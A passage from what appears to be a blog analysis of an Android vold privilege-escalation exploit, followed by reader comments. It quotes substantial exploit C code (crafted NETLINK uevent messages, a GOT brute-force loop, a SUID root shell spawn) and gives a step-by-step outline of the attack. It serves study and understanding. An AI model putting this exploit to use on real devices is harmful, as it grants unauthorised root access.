                	          "MAJOR=%s%cMINOR=%s%cDEVTYPE=%s%cPARTN=1",
                        	  0, 0, 0, bsh, 0, bsh, 0, bsh, 0, bsh, 0, bsh, 0);
	} else if (froyo) {
		n = snprintf(buf, sizeof(buf), "@/foo%cACTION=add%cSUBSYSTEM=block%c"
		                  "DEVPATH=%s%c"
                	          "MAJOR=179%cMINOR=%d%cDEVTYPE=harder%cPARTN=1",
                        	  0, 0, 0, bsh, 0, 0, vold.system, 0, 0);
	} else {
		n = snprintf(buf, sizeof(buf), "%s;@%s%cACTION=%s%cSUBSYSTEM=%s%c"
		                  "SEQNUM=%s%cDEVPATH=%s%c"
                	          "MAJOR=179%cMINOR=%d%cDEVTYPE=harder%cPARTN=1",
                        	  bsh, bsh, 0, bsh, 0, bsh, 0, bsh, 0, bsh, 0, 0, vold.system, 0, 0);
	}

	msg.msg_iov->iov_len = n;
	n = sendmsg(sock, &msg, 0);

	close(sock);

	return n;
}

```

This is the actual trigger code. It uses a NetLink socket to send the malicious messages with the negative index value. Moving back to main() we have‚Ä¶

```

	for (i = idx; j++ < (vold.got_end - vold.got_start); --i) {
		if (do_fault(i, 0) < 0) {
			++i; --j;
			printf("[-] sendmsg() failed?\n");
			continue;
		}
		printf("[*] vold: %04d idx: %08d\n", vold.pid, -i); fflush(stdout);
		stat(sh, &st);
		if ((st.st_mode & 04000) == 04000) {
			printf("\n\n[!] dance forever my only one\n");
			break;
		}
	}

```

This brute-force loop will attempt to exploit the addresses within the .GOT range using the previously mentioned do\_fault() routine. Using stat(2) it checks if the ‚Äòsh‚Äô mode includes SETUID bit and it will break out of the loop if this is the case. Next, main() goes like this‚Ä¶

```

	/* Last try, sometimes vold cant handle 2 receives in the order
	 * we like by do_fault()
	 */
	if ((st.st_mode & 04000) != 04000) {
		last_try(); last_try();
		stat(sh, &st);
		if ((st.st_mode & 04000) == 04000) {
			printf("\n[+] You are in luck! Last try succeeded!\n");
		} else {
			printf("\n[-] Bad luck. Fixed vold?\n");
			exit(1);
		}
	}

	execve(*ash, ash, env);
	return 0;
}

```

So, the last\_try() routine does not use do\_fault() you saw earlier but instead is like this.

```

/* Needed to make it work on 2.2 too
 */
static int last_try()
{
	char buf[0x1000];
	struct sockaddr_nl snl;
	struct iovec iov = {buf, sizeof(buf)};
	struct msghdr msg = {&snl, sizeof(snl), &iov, 1, NULL, 0, 0};
	int sock = -1, n = 0;

	do {
		find_vold();
		usleep(10000);
	} while (!vold.found);

	memset(buf, 0, sizeof(buf));
	memset(&snl, 0, sizeof(snl));
	snl.nl_family = AF_NETLINK;

	if ((sock = socket(PF_NETLINK, SOCK_DGRAM, NETLINK_KOBJECT_UEVENT)) < 0)
		die("[-] socket");
	snl.nl_pid = vold.pid;

	memset(buf, 0, sizeof(buf));

	n = snprintf(buf, sizeof(buf), "@/foo%cACTION=add%cSUBSYSTEM=block%c"
	                  "DEVPATH=%s%c"
               	          "MAJOR=179%cMINOR=%d%cDEVTYPE=harder%cPARTN=1",
                       	  0, 0, 0, bsh, 0, 0, vold.system, 0, 0);
	msg.msg_iov->iov_len = n;
	n = sendmsg(sock, &msg, 0);
	sleep(3);
	close(sock);
	return 0;
}

```

So, as an outline‚Ä¶

1) Make a copy of the exploit to /data/local/tmp/boomsh

2) Make a copy of system‚Äôs shell to /data/local/tmp/sh

3) Information gathering

4) Locate vold

5) Find vold‚Äôs .GOT addresses range

6) Find the device (default /devices/platform/msm\_sdcc.2/mmc\_host/mmc1)

7) Restart logcat using /data/local/tmp/crashlog as log file

8) Find the right index

9) Terminate logcat and remove crashlog

10) Bruteforce the .GOT range

11) Exploit it using NETLINK messages that will pass system()‚Äôs address as the MINOR value (value to be written) and the negative index to PARTN (index array)

12) vold will attempt to call the overwritten function and consequently it will call: system(‚Äú/data/local/tmp/boomsh‚Äù). Since this is executed as root, the initial UID check will be true and the following steps will be executed:

12a) Remount /data

12b) Make ‚Äò/data/local/tmp/sh‚Äô a SUID root binary

12c) exit

13) main() will check the ‚Äò/data/local/tmp/sh‚Äô permissions and if it is SUID root, it will execute it.

I really liked the information gathering in this exploit code. Great work.

1. I was looking at the source code to understand it, i am no gud at c, just trying to understand and I stumbled upon this very nice write-up. Thx for this article dude.

5. this is great explanation of the code. Thanks for putting things up. I have one question. What is the fault which we create through vold. We keep looking for fault address. When we try to write ‚Äú.got‚Äù area, we write to ‚Äúread only‚Äù area. Is that the fault or is it something else. How come we are allowed to write to read only area of vold.

   Thanks

7. There doesn‚Äôt seem to be any issue with DT\_PLTGOT having limited permissions but unfortunately I cannot test it right now to verify it. If possible, please check the permissions of DT\_PLTGOT on any of the affected versions of Android (3.0 and 2.x before 2.3.4) and let us all know.

   Sorry for the not-really-helpful reply

9. So the index value (presumably the GOT entry for strcmp() etc) is always below the array? IE, if we go far enough negative in the array index (any array?) we will eventually hit the GOT? can you further explain the index calculation portion?

   from what i gather, the exploit is just trying to overwrite any address within the GOT (which is either atoi(), strcmp(), etc) and replace that with system(). so then when we send it a ‚Äúlegitimate‚Äù message via Netlink, we pass an argument for our rootshell.
